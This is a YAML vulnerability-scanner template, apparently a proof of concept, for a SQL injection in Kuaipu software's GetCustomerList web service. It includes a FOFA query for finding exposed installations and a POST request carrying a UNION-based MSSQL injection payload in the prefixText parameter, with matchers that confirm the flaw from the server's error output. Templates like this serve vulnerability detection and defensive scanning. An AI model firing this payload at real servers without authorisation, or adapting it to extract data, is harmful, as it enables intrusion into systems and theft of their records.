id: poc-yaml-kuaipu-getcustomerlist-sqli
info:
  name: 快普软件 GetCustomerList SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 快普软件
  fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /WebService/wsAutoComplete.asmx/GetCustomerList
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: prefixText=a'+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),NULL--&count=1&contextKey=a
  expression: 'status_code == 500 &&

    contains(body,"0x" + t2) &&

    !contains(body,"<") &&

    matches(body,"转换成数据类型(.*?)时失败") &&

    matches(body,"在将(.*?)值")

    '
transport: http
